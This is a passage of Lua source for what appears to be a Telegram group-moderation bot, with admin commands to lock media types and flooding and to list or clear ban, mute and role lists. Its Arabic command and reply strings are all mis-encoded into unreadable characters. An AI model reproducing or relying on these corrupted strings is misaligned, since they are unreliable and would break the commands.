if text == "ΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:Sticker"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ" and Admin(msg) then
database:del(bot_id.."Lock:Sticker"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ" and Admin(msg) then
database:set(bot_id.."Lock:forward"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:forward"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:forward"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:forward"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨͺΩΨ¬ΩΩ" and Admin(msg) then
database:del(bot_id.."Lock:forward"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨͺΩΨ¬ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ" and Admin(msg) then
database:set(bot_id.."Lock:Document"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:Document"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:Document"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:Document"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΩΩΨ§Ψͺ" and Admin(msg) then
database:del(bot_id.."Lock:Document"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΩΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ³ΩΩΩΩ" and Admin(msg) then
database:set(bot_id.."Lock:Unsupported"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ³ΩΩΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ³ΩΩΩΩ Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:Unsupported"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ³ΩΩΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ³ΩΩΩΩ Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:Unsupported"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ³ΩΩΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ³ΩΩΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:Unsupported"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ³ΩΩΩΩ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ³ΩΩΩΩ" and Admin(msg) then
database:del(bot_id.."Lock:Unsupported"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ³ΩΩΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ" and Admin(msg) then
database:set(bot_id.."Lock:Markdaun"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:Markdaun"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:Markdaun"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:Markdaun"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ" and Admin(msg) then
database:del(bot_id.."Lock:Markdaun"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ" and Admin(msg) then
database:set(bot_id.."Lock:Contact"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:Contact"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:Contact"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:Contact"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ¬ΩΨ§Ψͺ" and Admin(msg) then
database:del(bot_id.."Lock:Contact"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ¬ΩΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄" and Admin(msg) then
database:set(bot_id.."Lock:Spam"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄ Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:Spam"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄ Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:Spam"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:Spam"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΩΨ§ΩΨ΄" and Admin(msg) then
database:del(bot_id.."Lock:Spam"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ§ΩΨ΄") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ" and Admin(msg) then
database:set(bot_id.."Lock:Inlen"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:Inlen"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:Inlen"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:Inlen"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ§ΩΩΨ§ΩΩ" and Admin(msg) then
database:del(bot_id.."Lock:Inlen"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ§ΩΩΨ§ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood","kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ±")
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ±" and Admin(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood","del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΨ­Ψ°Ω")
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood","keed") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ±")
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood","mute") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ±")
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨͺΩΨ±Ψ§Ψ±" and Admin(msg) then 
database:hdel(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood") 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨͺΩΨ±Ψ§Ψ±")
return false
end 

if text == ("ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω") and DevSonic(msg) then
database:del(bot_id.."GBan:User")
database:del(bot_id.."Gmute:User")
send(msg.chat_id_, msg.id_, "\nΩ­ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ (Ψ§ΩΨ­ΨΈΨ±/Ψ§ΩΩΨͺΩ) Ψ§ΩΨΉΨ§Ω")
return false
end
if text == ("ΩΨ³Ψ­ Ψ§ΩΩΩΩΨ²ΩΩ ΨΉΨ§Ω") and Devss(msg) then
database:del(bot_id.."Vip:all")
send(msg.chat_id_, msg.id_, "\nΩ­ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΩΨ²ΩΩ ΨΉΨ§Ω ")
end
if text == ("ΩΨ³Ψ­ Ψ§ΩΩΨ·ΩΨ±ΩΩ") and Devss(msg) then
database:del(bot_id.."Sudo:User")
send(msg.chat_id_, msg.id_, "\nΩ­ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ·ΩΨ±ΩΩ ")
end
if text == "ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ" and DevBot(msg) then
database:del(bot_id.."Basic:Creator"..msg.chat_id_)
texts = "Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩΩ"
send(msg.chat_id_, msg.id_, texts)
end
if text == "ΩΨ³Ψ­ Ψ§ΩΩΨ§ΩΩΩΩ" and DevBot(msg) then
database:del(bot_id.."Basic:Creator23"..msg.chat_id_)
texts = "Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΨ§ΩΩΩΩ"
send(msg.chat_id_, msg.id_, texts)
end
if text == "ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ" and SupCreator(msg) then
database:del(bot_id.."Creator"..msg.chat_id_)
texts = "Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ "
send(msg.chat_id_, msg.id_, texts)
end
if text == "ΩΨ³Ψ­ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘" and Creator(msg) then
database:del(bot_id.."Manager"..msg.chat_id_)
texts = "Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ "
send(msg.chat_id_, msg.id_, texts)
end
if text == "ΩΨ³Ψ­ Ψ§ΩΨ§Ψ―ΩΩΩΩ" and Manger(msg) then
database:del(bot_id.."Mod:User"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "Ω­ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ§Ψ―ΩΩΩΨ© ")
end
if text == "ΩΨ³Ψ­ Ψ§ΩΩΩΩΨ²ΩΩ" and Admin(msg) then
database:del(bot_id.."Special:User"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "Ω­ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ Ψ§ΩΩΩΩΨ²ΩΩ ")
end
if text == "ΩΨ³Ψ­ Ψ§ΩΩΩΨͺΩΩΩΩ" and Admin(msg) then
database:del(bot_id.."Muted:User"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "Ω­ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨͺΩΩΩΩ ")
end
if text == "ΩΨ³Ψ­ Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ" and Admin(msg) then
database:del(bot_id.."Ban:User"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "\nΩ­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ")
end
if text == ("ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω") and DevSonic(msg) then
local list = database:smembers(bot_id.."GBan:User")
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ ΨΉΨ§Ω \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ­ΨΈΩΨ±ΩΩ ΨΉΨ§Ω"
end
_key = {
{{text="ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω",callback_data="delbanall"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
if text == ("ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΨͺΩ Ψ§ΩΨΉΨ§Ω") and DevSonic(msg) then
local list = database:smembers(bot_id.."Gmute:User")
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΨͺΩΩΩΩ ΨΉΨ§Ω \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΩΨͺΩΩΩΩ ΨΉΨ§Ω"
end
_key = {
{{text="ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΨͺΩ Ψ§ΩΨΉΨ§Ω",callback_data="delmuteall"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
if text == ("Ψ§ΩΩΨ·ΩΨ±ΩΩ") and Devss(msg) then
local list = database:smembers(bot_id.."Sudo:User")
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© ΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ¨ΩΨͺ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ·ΩΨ±ΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΨ·ΩΨ±ΩΩ",callback_data="deldev"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
if text == ("Ψ§ΩΩΩΩΨ²ΩΩ ΨΉΨ§Ω") or text == ("Ψ§ΩΩΩΩΨ²ΩΩ Ψ§ΩΨΉΨ§Ω") and Devss(msg) then
local list = database:smembers(bot_id.."Vip:all")
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΩΨ²ΩΩ ΨΉΨ§Ω \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΩΩΨ²ΩΩ ΨΉΨ§Ω"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΩΩΨ²ΩΩ ΨΉΨ§Ω",callback_data="delvipall"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
if text == "Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ" and DevBot(msg) then
local list = database:smembers(bot_id.."Basic:Creator"..msg.chat_id_)
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΩΨ΄Ψ¦ΩΩ Ψ§Ψ³Ψ§Ψ³ΩΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ",callback_data="delasas"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
if text == "Ψ§ΩΩΨ§ΩΩΩΩ" and DevBot(msg) then
local list = database:smembers(bot_id.."Basic:Creator23"..msg.chat_id_)
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ§ΩΩΩΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ§ΩΩΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΨ§ΩΩΩΩ",callback_data="delowner"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
if text == ("Ψ§ΩΩΩΨ΄Ψ¦ΩΩ") and SupCreator(msg) then
local list = database:smembers(bot_id.."Creator"..msg.chat_id_)
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΨ΄Ψ¦ΩΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΩΨ΄Ψ¦ΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ",callback_data="delmonsh"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
if text == ("Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘") and Creator(msg) then
local list = database:smembers(bot_id.."Manager"..msg.chat_id_)
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ―Ψ±Ψ§Ψ‘"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘",callback_data="delmanger"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
if text == ("Ψ§ΩΨ§Ψ―ΩΩΩΩ") and Manger(msg) then
local list = database:smembers(bot_id.."Mod:User"..msg.chat_id_)
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ§Ψ―ΩΩΩΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ§Ψ―ΩΩΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΨ§Ψ―ΩΩΩΩ",callback_data="delmod"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
if text == ("Ψ§ΩΩΩΩΨ²ΩΩ") and Admin(msg) then
local list = database:smembers(bot_id.."Special:User"..msg.chat_id_)
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© ΩΩΩΨ²ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΩΩΨ²ΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΩΩΨ²ΩΩ",callback_data="delvip"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
if text == ("Ψ§ΩΩΩΨͺΩΩΩΩ") and Admin(msg) then
local list = database:smembers(bot_id.."Muted:User"..msg.chat_id_)
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΨͺΩΩΩΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΩΨͺΩΩΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΩΨͺΩΩΩΩ",callback_data="delmute"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end

if text == ("Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ") and Admin(msg) then
local list = database:smembers(bot_id.."Ban:User"..msg.chat_id_)
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© ΩΨ­ΨΈΩΨ±ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
